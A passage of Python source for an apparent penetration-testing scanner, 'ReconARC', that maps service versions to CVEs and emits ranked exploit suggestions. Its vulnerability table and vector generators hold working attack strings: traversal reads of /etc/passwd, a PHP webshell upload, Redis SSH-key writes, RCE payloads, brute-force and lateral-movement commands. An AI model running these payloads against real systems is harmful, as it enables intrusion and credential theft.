"""
ReconARC — Vulnerability Scanner
=================================
Maps discovered services to CVEs, ranks attack vectors, and generates
exploit suggestions WITHOUT executing any exploit.
"""

import hashlib
import re
from typing import Dict, List, Optional

from utils import run_command
from state import AttackVector


def search_exploitdb(query: str) -> List[dict]:
    """Search local exploitdb via searchsploit."""
    cmd = f"searchsploit --json '{query}' 2>/dev/null"
    result = run_command(cmd, timeout=15)
    if result["stdout"]:
        try:
            import json
            data = json.loads(result["stdout"])
            return [
                {
                    "title": e.get("Title", ""),
                    "type": e.get("Type", ""),
                    "path": e.get("Path", ""),
                    "platform": e.get("Platform", ""),
                }
                for e in data.get("RESULTS_EXPLOIT", [])[:10]
            ]
        except (json.JSONDecodeError, KeyError):
            pass
    return []


def nmap_vuln_scan(target_ip: str, port: int = None) -> List[dict]:
    """Run nmap vuln category scripts (safe, non-intrusive)."""
    port_flag = f"-p {port}" if port else ""
    cmd = (
        f"nmap {port_flag} --script 'vuln and safe' "
        f"{target_ip} -oN - 2>/dev/null"
    )
    result = run_command(cmd, timeout=120)
    findings = []

    if result["stdout"]:
        # Parse VULNERABLE lines
        for m in re.finditer(r"(\d+)/tcp\s+open\s+(\S+)", result["stdout"]):
            findings.append({
                "port": int(m.group(1)),
                "service": m.group(2),
                "type": "open_service",
            })

        # Parse vulnerability info
        for m in re.finditer(r"\|\s+([A-Z][^:]+):\s*(.+)", result["stdout"]):
            vuln_name = m.group(1).strip()
            vuln_detail = m.group(2).strip()
            if vuln_name not in ("State", "IDs", "References", "CVSS"):
                findings.append({
                    "vulnerability": vuln_name,
                    "detail": vuln_detail,
                    "type": "vuln_script_finding",
                })

    return findings


# ── Known version-based CVE mapping ───────────────────────────────────

KNOWN_VULNS = {
    # SSH
    "openssh 7.": [
        {"cve": "CVE-2018-15473", "title": "OpenSSH User Enumeration",
         "desc": "Allows username enumeration via timing differences",
         "confidence": "high", "score": 65,
         "suggestions": [
             "Use python3 ssh-enum.py or metasploit auxiliary/scanner/ssh/ssh_enumusers",
             "Enumerate valid usernames for credential brute-force",
         ]},
    ],
    "openssh 8.2": [
        {"cve": "CVE-2020-15778", "title": "OpenSSH SCP command injection",
         "desc": "SCP client allows command injection via crafted filenames",
         "confidence": "medium", "score": 55,
         "suggestions": [
             "If SCP is available, inject commands via filenames: scp 'file;command' user@host:/tmp/",
         ]},
    ],
    # Apache
    "apache 2.4.49": [
        {"cve": "CVE-2021-41773", "title": "Apache Path Traversal",
         "desc": "Directory traversal allowing access to arbitrary files",
         "confidence": "high", "score": 80,
         "suggestions": [
             "curl http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
             "If mod_cgi enabled, achieve RCE via POST to cgi-bin",
             "Metasploit: exploit/multi/http/apache_normalize_path_rce",
         ]},
    ],
    "apache 2.4.50": [
        {"cve": "CVE-2021-42013", "title": "Apache Path Traversal (bypass)",
         "desc": "Bypass for CVE-2021-41773 patch",
         "confidence": "high", "score": 80,
         "suggestions": [
             "curl http://target/cgi-bin/%%32%65/%%32%65/%%32%65/%%32%65/etc/passwd",
         ]},
    ],
    # nginx
    "nginx 1.18": [
        {"cve": "CVE-2021-23017", "title": "nginx DNS Resolver vulnerability",
         "desc": "1-byte memory overwrite in DNS resolver",
         "confidence": "low", "score": 30,
         "suggestions": [
             "Only exploitable if nginx uses the resolver directive",
             "Check config for 'resolver' directive",
         ]},
    ],
    # ProFTPD
    "proftpd 1.3": [
        {"cve": "CVE-2015-3306", "title": "ProFTPD mod_copy File Manipulation",
         "desc": "Remote file copy/read/write via mod_copy commands",
         "confidence": "high", "score": 75,
         "suggestions": [
             "Use site cpfr/sitet cpto commands to copy files",
             "Copy /etc/shadow or add SSH key to authorized_keys",
             "Metasploit: exploit/unix/ftp/proftpd_modcopy_exec",
         ]},
    ],
    # vsftpd
    "vsftpd 2.3.4": [
        {"cve": "CVE-2011-2523", "title": "vsftpd Backdoor",
         "desc": "Backdoor trigger via smiley face in username (:))",
         "confidence": "high", "score": 95,
         "suggestions": [
             "Connect with username containing ':)' to trigger backdoor on port 6200",
             "Metasploit: exploit/unix/ftp/vsftpd_234_backdoor",
         ]},
    ],
    # Redis
    "redis 6.": [
        {"cve": "N/A", "title": "Redis Unauthenticated Access",
         "desc": "Redis without authentication allows data access and potential RCE",
         "confidence": "high", "score": 75,
         "suggestions": [
             "Connect: redis-cli -h target",
             "Write SSH key: CONFIG SET dir /root/.ssh + SET x 'key' + SAVE",
             "Write webshell: CONFIG SET dir /var/www/html + SET x 'php' + SAVE",
             "Lua sandbox escape for older versions",
         ]},
    ],
    # Jenkins
    "jenkins": [
        {"cve": "CVE-2024-23897", "title": "Jenkins Arbitrary File Read",
         "desc": "CLI arbitrary file read via @filepath arguments",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Download CLI jar: wget http://target/jnlpJars/jenkins-cli.jar",
             "Read files: java -jar jenkins-cli.jar -s http://target help '@filename'",
             "Read credentials/secrets via @/var/lib/jenkins/secrets.masterKey",
         ]},
    ],
    # GitLab
    "gitlab": [
        {"cve": "CVE-2021-22205", "title": "GitLab ExifTool RCE",
         "desc": "Remote code execution via crafted image upload",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Use djvu_file_maker to craft malicious image",
             "Upload to any project issue/MR",
             "Metasploit: exploit/multi/http/gitlab_shell_exec_rce",
         ]},
    ],
    # Grafana
    "grafana": [
        {"cve": "CVE-2021-43798", "title": "Grafana Arbitrary File Read",
         "desc": "Path traversal in plugin URLs allows reading arbitrary files",
         "confidence": "high", "score": 80,
         "suggestions": [
             "curl http://target/public/plugins/alertlist/../../../../../../../etc/passwd",
             "Read /etc/grafana/grafana.ini for database credentials",
         ]},
    ],
    # WebLogic
    "weblogic": [
        {"cve": "CVE-2020-14882", "title": "WebLogic Authentication Bypass",
         "desc": "Authentication bypass via console path traversal",
         "confidence": "high", "score": 90,
         "suggestions": [
             "curl http://target/console/css/%252e%252e%252fconsole.portal",
             "Execute commands via Groovy console",
         ]},
    ],
    # ── NEW ENTRIES ──
    # Tomcat
    "tomcat/7.": [
        {"cve": "CVE-2017-12617", "title": "Tomcat PUT Method RCE",
         "desc": "Remote code execution via PUT method on Windows",
         "confidence": "high", "score": 80,
         "suggestions": [
             "PUT a JSP webshell via curl -X PUT 'http://target/shell.jsp/' -d @shell.jsp",
             "Access shell at http://target/shell.jsp",
         ]},
    ],
    "tomcat/8.5": [
        {"cve": "CVE-2017-12615", "title": "Tomcat PUT Method RCE",
         "desc": "Remote code execution via PUT method",
         "confidence": "high", "score": 80,
         "suggestions": [
             "PUT a JSP webshell via curl -X PUT 'http://target/shell.jsp/' -d @shell.jsp",
         ]},
    ],
    # Apache Struts
    "struts": [
        {"cve": "CVE-2017-5638", "title": "Apache Struts2 RCE (S2-045)",
         "desc": "RCE via malicious Content-Type header",
         "confidence": "high", "score": 95,
         "suggestions": [
             "Send malicious Content-Type header with OGNL expression",
             "Metasploit: exploit/multi/http/struts2_content_type_ognl",
         ]},
    ],
    # PHP
    "php/7.": [
        {"cve": "CVE-2019-11043", "title": "PHP-FPM RCE (NGINX)",
         "desc": "PHP-FPM remote code execution via crafted URL",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Use phuip-fpizdam tool to exploit",
             "Affects nginx + PHP-FPM with specific fastcgi_split_path_info config",
         ]},
    ],
    "php/8.": [
        {"cve": "CVE-2024-4577", "title": "PHP CGI Argument Injection RCE",
         "desc": "Argument injection in PHP CGI mode (Windows, Windows-1252)",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Exploit via crafted query string with soft hyphen character",
             "Affects PHP CGI mode on Windows with locale that uses GBK/CP936",
         ]},
    ],
    # IIS
    "iis/6.": [
        {"cve": "CVE-2017-7269", "title": "IIS 6.0 WebDAV Buffer Overflow",
         "desc": "Remote code execution via WebDAV ScStoragePathFromUrl",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Metasploit: exploit/windows/iis/iis_webdav_scstoragepathfromurl",
             "Target: Windows Server 2003 R2 with WebDAV enabled",
         ]},
    ],
    "iis/7.": [
        {"cve": "N/A", "title": "IIS Short Name Scanner",
         "desc": "8.3 short filename disclosure allows file/dir name guessing",
         "confidence": "medium", "score": 50,
         "suggestions": [
             "Use java -jar iis_shortname_scanner.jar http://target/",
             "Reveals first/last chars of files/directories",
         ]},
    ],
    "iis/10": [
        {"cve": "CVE-2020-0688", "title": "Exchange ECP RCE",
         "desc": "Exchange Control Panel ViewState RCE via known validation key",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Metasploit: exploit/windows/http/exchange_ecp_viewstate",
             "Requires valid credentials or low-priv access",
         ]},
    ],
    # Samba
    "samba 3.": [
        {"cve": "CVE-2017-7494", "title": "Samba RCE (SambaCry)",
         "desc": "Remote code execution via writable share + library upload",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Upload shared library to writable share",
             "Trigger execution by opening a file with specific path",
             "Metasploit: exploit/linux/samba/is_known_pipename",
         ]},
    ],
    # Elasticsearch
    "elasticsearch": [
        {"cve": "CVE-2015-1427", "title": "Elasticsearch Groovy RCE",
         "desc": "Remote code execution via Groovy scripting engine",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Send script with MVEL/Groovy expression",
             "Affects Elasticsearch 1.2.0 - 1.3.7 and 1.4.0 - 1.4.2",
         ]},
    ],
    # MongoDB
    "mongodb": [
        {"cve": "N/A", "title": "MongoDB Unauthenticated Access",
         "desc": "MongoDB without authentication exposes all databases",
         "confidence": "high", "score": 75,
         "suggestions": [
             "Connect: mongo --host target:27017",
             "List databases: show dbs; use admin; db.adminCommand({listDatabases:1})",
         ]},
    ],
    # Spring Boot
    "spring boot": [
        {"cve": "CVE-2022-22965", "title": "Spring4Shell RCE",
         "desc": "RCE via data binding on JDK 9+",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Metasploit: exploit/multi/http/spring4shell",
             "Requires specific class loader + JDK 9+",
         ]},
    ],
    "spring cloud": [
        {"cve": "CVE-2022-22963", "title": "Spring Cloud Function SpEL RCE",
         "desc": "RCE via SpEL injection in spring.cloud.function.routing-expression",
         "confidence": "high", "score": 95,
         "suggestions": [
             "curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")' http://target/functionRouter",
         ]},
    ],
    # Apache Solr
    "solr": [
        {"cve": "CVE-2019-17558", "title": "Solr Velocity Template RCE",
         "desc": "RCE via Velocity template injection",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Modify config with Velocity template payload",
             "Trigger via search request",
         ]},
    ],
    # Apache OFBiz
    "ofbiz": [
        {"cve": "CVE-2024-45195", "title": "OFBiz SSRF / RCE",
         "desc": "Authentication bypass and RCE via crafted requests",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Exploit via /webtools/control/ProgramExport endpoint",
         ]},
    ],
    # Confluence
    "confluence": [
        {"cve": "CVE-2023-22515", "title": "Confluence Server RCE",
         "desc": "Unauthenticated RCE via OGNL injection",
         "confidence": "high", "score": 95,
         "suggestions": [
             "Access /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
             "Create admin account and enable plugin",
         ]},
    ],
    # ThinkPHP
    "thinkphp": [
        {"cve": "N/A", "title": "ThinkPHP 5.x RCE",
         "desc": "Remote code execution via method parameter",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Payload: /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
         ]},
    ],
    # Drupal
    "drupal 7": [
        {"cve": "CVE-2018-7600", "title": "Drupalgeddon2 RCE",
         "desc": "Unauthenticated RCE via form API",
         "confidence": "high", "score": 95,
         "suggestions": [
             "curl -d 'form_id=user_register_form&...RCE...' http://target/user/register",
             "Metasploit: exploit/unix/webapp/drupal_drupalgeddon2",
         ]},
    ],
    "drupal 8": [
        {"cve": "CVE-2019-6340", "title": "Drupalgeddon3 RCE",
         "desc": "RCE via REST module",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Send crafted JSON to /node/?_format=hal_json",
             "Metasploit: exploit/multi/http/drupal_drupalgeddon3",
         ]},
    ],
    # SonicWall
    "sonicwall": [
        {"cve": "CVE-2021-20016", "title": "SonicWall SQL Injection",
         "desc": "SQL injection in SSLVPN authentication",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Target: /cgi-bin/welcome and /cgi-bin/users",
         ]},
    ],
    # FortiOS
    "fortios": [
        {"cve": "CVE-2024-23113", "title": "FortiOS Format String Vulnerability",
         "desc": "Format string in SSL VPN may allow RCE",
         "confidence": "medium", "score": 70,
         "suggestions": [
             "Target: /remote/error?errmsg= format string payload",
         ]},
    ],
    # Tomcat Manager
    "tomcat manager": [
        {"cve": "N/A", "title": "Tomcat Manager Default Credentials",
         "desc": "Try default credentials: tomcat:tomcat, admin:admin",
         "confidence": "medium", "score": 65,
         "suggestions": [
             "Try login at /manager/html with: tomcat:tomcat, admin:admin, admin:s3cret",
             "If successful: upload WAR file for RCE",
             "Metasploit: exploit/multi/http/tomcat_mgr_upload",
         ]},
    ],
    # PHP Composer
    "composer": [
        {"cve": "CVE-2022-24828", "title": "Composer Command Injection",
         "desc": "Command injection via crafted package name",
         "confidence": "medium", "score": 60,
         "suggestions": [
             "Craft malicious composer.json with command injection in package URL",
         ]},
    ],
    # PowerShell
    "powershell": [
        {"cve": "N/A", "title": "PSRemoting / WinRM Available",
         "desc": "PowerShell remote management available for lateral movement",
         "confidence": "high", "score": 65,
         "suggestions": [
             "Test: crackmapexec winrm TARGET -u USER -p PASS -x 'whoami'",
             "Evil-WinRM: evil-winrm -u USER -p PASS -i TARGET",
         ]},
    ],
    # Apache Shiro
    "shiro": [
        {"cve": "CVE-2016-4437", "title": "Apache Shiro Deserialization RCE",
         "desc": "RCE via remember-me cookie deserialization",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Detect: check for 'rememberMe=deleteMe' cookie in response",
             "Use shiro-721 or shiro-550 exploit tools",
         ]},
    ],
    # Atlassian Jira
    "jira": [
        {"cve": "CVE-2019-11581", "title": "Jira SSTI",
         "desc": "Server-side template injection in contacthelplet",
         "confidence": "high", "score": 75,
         "suggestions": [
             "Access /secure/ContactAdministrators!default.jspa with SSTI payload",
         ]},
    ],
    # Cisco Smart Install
    "cisco": [
        {"cve": "CVE-2018-0171", "title": "Cisco Smart Install RCE",
         "desc": "Remote code execution via Smart Install Protocol",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Check port 4786 (TCP) for Smart Install Protocol",
             "Use esi.py tool for exploitation",
         ]},
    ],
    # OpenSMTPD
    "opensmtpd": [
        {"cve": "CVE-2020-7247", "title": "OpenSMTPD RCE",
         "desc": "Remote code execution via crafted MAIL FROM",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Send malformed SMTP message with shell payload",
         ]},
    ],
    # Exim
    "exim 4.": [
        {"cve": "CVE-2019-10149", "title": "Exim RCE (Return of the WIZard)",
         "desc": "Remote code execution via crafted recipient address",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Target: local_delivery with shell metacharacters",
             "Metasploit: exploit/linux/smtp/exim_wizz",
         ]},
    ],
}


def match_version_vulns(service: str, version: str) -> List[dict]:
    """Match service version against known vulnerability database."""
    vulns = []
    combined = f"{service} {version}".lower().strip()

    for key, entries in KNOWN_VULNS.items():
        if key in combined:
            for entry in entries:
                vulns.append(entry)

    return vulns


def generate_attack_vector(
    category: str,
    vector_type: str,
    target: str,
    title: str,
    description: str,
    confidence: str = "medium",
    score: int = 50,
    evidence: List[str] = None,
    exploit_suggestions: List[str] = None,
    prerequisites: List[str] = None,
    cves: List[str] = None,
    references: List[str] = None,
) -> AttackVector:
    """Generate a structured attack vector with unique ID."""
    vid = hashlib.sha256(f"{target}:{vector_type}:{title}".encode()).hexdigest()[:8]

    confidence_scores = {"high": 80, "medium": 50, "low": 25}
    if score == 50 and confidence in confidence_scores:
        score = confidence_scores[confidence]

    return AttackVector(
        id=f"{vector_type}:{vid}",
        target=target,
        category=category,
        vector_type=vector_type,
        title=title,
        description=description,
        confidence=confidence,
        score=score,
        evidence=evidence or [],
        exploit_suggestions=exploit_suggestions or [],
        prerequisites=prerequisites or [],
        cves=cves or [],
        references=references or [],
    )


# ── Attack Vector Generators ──────────────────────────────────────────

def vectors_for_web_app(url: str, web_info: dict, config_findings: List[dict],
                        sqli_points: List[dict], tech: dict) -> List[AttackVector]:
    """Generate attack vectors for a discovered web application."""
    vectors = []

    # Config file exposure
    for finding in config_findings:
        if finding["severity"] == "critical":
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="config_exposure",
                target=url, title=f"Exposed {finding['path']} with secrets",
                description=f"Config file at {finding['path']} contains sensitive data. "
                            f"Preview: {finding.get('preview', '')[:100]}",
                confidence="high", score=85,
                evidence=[f"{finding['path']} returned {finding['status']} "
                          f"({finding['size']}b) with secret keywords"],
                exploit_suggestions=[
                    f"Read full content: curl -sk {url}{finding['path']}",
                    "Extract credentials and test against login forms",
                    "Try database credentials against MySQL/PostgreSQL",
                ],
                prerequisites=["Network access to target"],
            ))
        elif finding["severity"] == "high":
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="info_disclosure",
                target=url, title=f"Exposed {finding['path']}",
                description=f"Sensitive endpoint at {finding['path']}",
                confidence="high", score=70,
                evidence=[f"{finding['path']} -> {finding['status']}"],
                exploit_suggestions=[
                    f"Access {url}{finding['path']} for debug info/credentials",
                ],
            ))

    # SQLi injection points
    for point in sqli_points:
        param = point.get("parameter", "")
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="sqli",
            target=f"{point['url']} ({param})",
            title=f"Potential SQLi in {param}",
            description=f"{point['note']} — parameter '{param}' in "
                        f"{point.get('method', 'GET')} request",
            confidence="medium", score=55,
            evidence=[point["note"]],
            exploit_suggestions=[
                f"sqlmap -u '{point['url']}' --forms --batch --level=3 --risk=2",
                f"Manual test: ' OR 1=1-- , ' UNION SELECT 1,2,3-- ",
                "If injectable: dump user tables, try --os-shell",
            ],
            prerequisites=["Network access to target"],
        ))

    # Tech-specific vulns
    for vuln_tech, entries in KNOWN_VULNS.items():
        tech_str = " ".join(tech.get("technologies", [])).lower()
        if vuln_tech in tech_str:
            for entry in entries:
                vectors.append(generate_attack_vector(
                    category="initial_access", vector_type="known_cve",
                    target=url, title=entry["title"],
                    description=entry["desc"], confidence=entry["confidence"],
                    score=entry["score"],
                    evidence=[f"Technology {vuln_tech} detected"],
                    exploit_suggestions=entry.get("suggestions", []),
                    cves=[entry.get("cve", "")],
                ))

    # Missing security headers
    sec_headers = tech.get("security_headers", {})
    if "Content-Security-Policy" not in sec_headers:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="xss",
            target=url, title="Missing CSP — XSS potential",
            description="No Content-Security-Policy header. Stored/reflected XSS "
                        "could be exploitable without CSP mitigation.",
            confidence="medium", score=40,
            evidence=["No CSP header in response"],
            exploit_suggestions=[
                "Test input fields for reflected/stored XSS",
                "If admin panel exists, try stored XSS for cookie theft",
            ],
        ))

    # CORS misconfiguration
    cors = tech.get("cors") or {}
    if cors.get("reflects"):
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="cors",
            target=url, title="CORS Origin Reflection",
            description="Server reflects arbitrary Origin headers in CORS policy. "
                        "If credentials are allowed, this enables cross-origin data theft.",
            confidence="high", score=70,
            evidence=[f"ACAO reflects origin, ACAC={cors.get('credentials', False)}"],
            exploit_suggestions=[
                "Craft malicious page with fetch() to steal data cross-origin",
                "If credentials=true: steal user session data from any origin",
            ],
        ))

    return vectors


def vectors_for_extra_web(url: str, js_findings: List[dict], http_methods: dict,
                          backup_findings: List[dict], param_findings: List[str],
                          crawled_links: List[dict] = None) -> List[AttackVector]:
    """Generate vectors from advanced web enumeration."""
    vectors = []

    # JS secrets
    for finding in js_findings:
        if finding["type"] == "js_secret":
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="js_secret",
                target=f"{url} ({finding['file']})",
                title=f"Secret in JS: {finding['secret_type']}",
                description=f"JavaScript file '{finding['file']}' contains a {finding['secret_type']}. "
                            f"Preview: {finding.get('preview', '')[:60]}",
                confidence="high", score=80,
                evidence=[f"JS secret: {finding['secret_type']}"],
                exploit_suggestions=[
                    f"Download and analyze: {url}{finding['file']}",
                    "Extract full secret and test against API endpoints",
                    "Check if it's a JWT — decode at jwt.io",
                ],
            ))
        elif finding["type"] == "js_api_endpoints":
            endpoints = finding.get("endpoints", [])
            if endpoints:
                vectors.append(generate_attack_vector(
                    category="initial_access", vector_type="api_endpoints",
                    target=f"{url} ({finding['file']})",
                    title=f"API endpoints in JS: {len(endpoints)} found",
                    description=f"JavaScript file leaks API endpoints: {', '.join(endpoints[:5])}",
                    confidence="medium", score=55,
                    evidence=[f"JS endpoints: {endpoints[:5]}"],
                    exploit_suggestions=[
                        f"Test each endpoint: {', '.join(endpoints[:3])}",
                        "Try SQLi, IDOR, auth bypass on each endpoint",
                    ],
                ))

    # HTTP methods
    methods = http_methods.get("methods", [])
    if "PUT" in str(methods) or http_methods.get("put_test"):
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="http_put",
            target=url,
            title="HTTP PUT Method Enabled",
            description="Server allows PUT method — potential webshell upload",
            confidence="high", score=75,
            evidence=[f"Methods: {methods}", http_methods.get("put_test", "")],
            exploit_suggestions=[
                f"Upload webshell: curl -X PUT '{url}/shell.php' -d '<?php system($_GET[\"cmd\"]);?>'",
                f"Access: {url}/shell.php?cmd=id",
            ],
        ))
    if "TRACE" in str(methods) or "TRACE (active)" in methods:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="http_trace",
            target=url,
            title="HTTP TRACE Method Enabled (XST)",
            description="TRACE method allows Cross-Site Tracing attacks",
            confidence="low", score=30,
            evidence=["TRACE method active"],
            exploit_suggestions=[
                "Combine with XSS to steal HttpOnly cookies via XST",
            ],
        ))

    # CORS in http_methods
    cors = http_methods.get("cors")
    if cors and cors.get("reflects"):
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="cors",
            target=url, title="CORS Origin Reflection",
            description="Server reflects arbitrary Origin headers. "
                        "If credentials are allowed, this enables cross-origin data theft.",
            confidence="high", score=70,
            evidence=[f"ACAO={cors.get('origin')}, ACAC={cors.get('credentials')}"],
            exploit_suggestions=[
                "Craft malicious page with fetch() to steal data cross-origin",
                "If credentials=true: steal user session data from any origin",
            ],
        ))

    # Backup files
    for bf in backup_findings:
        severity = "high" if bf.get("type") == "git_exposure" else "medium"
        score = 80 if bf.get("type") == "git_exposure" else 60
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="backup_file",
            target=f"{url}{bf['path']}",
            title=f"Exposed backup: {bf['path']}",
            description=f"Backup file accessible ({bf['size']}b). Preview: {bf.get('preview', '')[:60]}",
            confidence="high" if severity == "high" else "medium", score=score,
            evidence=[f"{bf['path']} -> {bf['status']}"],
            exploit_suggestions=[
                f"Download: curl {url}{bf['path']}",
                "Extract credentials, database config, source code",
                "If .git: use git-dumper to extract full repository",
            ],
        ))

    # Interesting parameters discovered
    if param_findings:
        interesting = [p for p in param_findings if p in
                       ("file", "path", "url", "redirect", "cmd", "page",
                        "template", "include", "id", "query", "search")]
        if interesting:
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="interesting_params",
                target=url,
                title=f"Interesting URL parameters: {', '.join(interesting[:5])}",
                description=f"Parameters that affect responses: {', '.join(interesting[:5])}. "
                            "Potential for LFI, SSRF, SQLi, or command injection.",
                confidence="medium", score=55,
                evidence=[f"Active params: {interesting[:5]}"],
                exploit_suggestions=[
                    f"LFI test: ?{interesting[0]}=../../../../etc/passwd",
                    f"SSRF test: ?{interesting[0]}=http://127.0.0.1:80",
                    f"SQLi test: ?{interesting[0]}=1' OR 1=1--",
                ],
            ))

    # Crawled links — check for interesting paths
    if crawled_links:
        interesting_paths = []
        for link in crawled_links:
            path = link.get("path", "").lower()
            if any(kw in path for kw in ["admin", "config", "upload", "download",
                                          "api", "user", "login", "dashboard",
                                          "backup", "secret", "debug", "test"]):
                interesting_paths.append(link["path"])
        if interesting_paths:
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="interesting_paths",
                target=url,
                title=f"Interesting paths via crawl: {', '.join(interesting_paths[:3])}",
                description=f"Deep-linked paths discovered: {', '.join(interesting_paths[:5])}",
                confidence="medium", score=50,
                evidence=[f"Crawled: {interesting_paths[:5]}"],
                exploit_suggestions=[
                    f"Test each for auth bypass, IDOR, injection",
                ],
            ))

    return vectors


def vectors_for_service(target: str, port: int, service: str, version: str) -> List[AttackVector]:
    """Generate attack vectors for a network service."""
    vectors = []

    # Anonymous FTP
    if "ftp" in service.lower() and "anonymous" in str(version).lower():
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="anonymous_ftp",
            target=f"{target}:{port}",
            title="Anonymous FTP Access",
            description="FTP server allows anonymous login",
            confidence="high", score=60,
            evidence=["Anonymous FTP banner detected"],
            exploit_suggestions=[
                f"ftp {target} (user: anonymous, pass: anonymous@)",
                "Download all files recursively: wget -r ftp://anonymous:anonymous@{target}/",
                "Check for configuration files, credentials, or sensitive data",
            ],
        ))

    # Known version vulns
    version_vulns = match_version_vulns(service, version)
    for vuln in version_vulns:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="version_vuln",
            target=f"{target}:{port}",
            title=vuln["title"], description=vuln["desc"],
            confidence=vuln["confidence"], score=vuln["score"],
            evidence=[f"{service} {version} on port {port}"],
            exploit_suggestions=vuln.get("suggestions", []),
            cves=[vuln.get("cve", "")],
        ))

    # SMB null session
    if port == 445 or "smb" in service.lower():
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="smb_null",
            target=f"{target}:{port}",
            title="SMB Null Session",
            description="Test for SMB null session access to enumerate shares/users",
            confidence="medium", score=50,
            evidence=[f"SMB on port {port}"],
            exploit_suggestions=[
                f"smbclient -L //{target}/ -N",
                f"rpcclient -U '' -N {target}",
                f"enum4linux-ng {target}",
                f"crackmapexec smb {target} -u '' -p ''",
            ],
        ))

    # SSH brute force potential
    if "ssh" in service.lower():
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="ssh_bruteforce",
            target=f"{target}:{port}",
            title="SSH Credential Brute Force",
            description="SSH service detected — brute force possible with valid usernames",
            confidence="low", score=30,
            evidence=[f"SSH {version} on port {port}"],
            exploit_suggestions=[
                f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                "After getting usernames from web/email enumeration",
            ],
            prerequisites=["Valid username list"],
        ))

    # Redis unauthenticated
    if "redis" in service.lower() or port == 6379:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="redis_unauth",
            target=f"{target}:{port}",
            title="Redis Unauthenticated Access",
            description="Redis may allow unauthenticated access leading to RCE",
            confidence="high", score=75,
            evidence=[f"Redis on port {port}"],
            exploit_suggestions=[
                f"redis-cli -h {target}",
                "CONFIG SET dir /root/.ssh && CONFIG SET dbfilename authorized_keys",
                "SET x '\\nssh-rsa AAAA...' && SAVE",
            ],
        ))

    # RDP
    if "rdp" in service.lower() or port == 3389:
        vectors.append(generate_attack_vector(
            category="lateral", vector_type="rdp",
            target=f"{target}:{port}",
            title="RDP Access",
            description="RDP service available for remote desktop access with valid credentials",
            confidence="medium", score=55,
            evidence=[f"RDP on port {port}"],
            exploit_suggestions=[
                f"xfreerdp /v:{target} /u:USERNAME /p:PASSWORD",
                "BlueKeep check if Windows XP/7/Server 2008",
            ],
        ))

    # WinRM
    if "winrm" in service.lower() or port == 5985:
        vectors.append(generate_attack_vector(
            category="lateral", vector_type="winrm",
            target=f"{target}:{port}",
            title="WinRM Remote Management",
            description="WinRM available for remote command execution with credentials",
            confidence="high", score=70,
            evidence=[f"WinRM on port {port}"],
            exploit_suggestions=[
                f"evil-winrm -u USERNAME -p PASSWORD -i {target}",
                "CrackMapExec: crackmapexec winrm {target} -u USER -p PASS -x 'whoami'",
            ],
        ))

    # LDAP/AD
    if port in (389, 636, 3268):
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="ldap_enum",
            target=f"{target}:{port}",
            title="LDAP Enumeration",
            description="LDAP service allows domain user/group enumeration",
            confidence="high", score=60,
            evidence=[f"LDAP on port {port}"],
            exploit_suggestions=[
                f"ldapsearch -x -H ldap://{target}",
                f"windapsearch -d --dc-ip {target}",
                "Enumerate users for AS-REP roasting and password spraying",
            ],
        ))

    # SNMP
    if "snmp" in service.lower() or port == 161:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="snmp_enum",
            target=f"{target}:{port}",
            title="SNMP Information Disclosure",
            description="SNMP service may leak system info, processes, software, network config",
            confidence="high", score=65,
            evidence=[f"SNMP on UDP port {port}"],
            exploit_suggestions=[
                f"snmpwalk -v2c -c public {target}",
                f"snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.4.2.1.2  # processes",
                f"snmpwalk -v2c -c public {target} 1.3.6.1.2.1.4.20  # interfaces",
                f"onesixtyone -c communities.txt {target}",
            ],
        ))

    # NFS
    if "nfs" in service.lower() or port == 2049:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="nfs_mount",
            target=f"{target}:{port}",
            title="NFS Export — Potential File Access",
            description="NFS exports may allow mounting remote filesystems",
            confidence="high", score=70,
            evidence=[f"NFS on port {port}"],
            exploit_suggestions=[
                f"showmount -e {target}",
                f"mkdir /tmp/nfs && mount -t nfs {target}:/ /tmp/nfs",
                "Look for SSH keys, config files, passwords in mounted share",
                "If writeable: upload SSH key to /root/.ssh/authorized_keys",
            ],
        ))

    # SMTP
    if "smtp" in service.lower() or port in (25, 465, 587):
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="smtp_enum",
            target=f"{target}:{port}",
            title="SMTP User Enumeration",
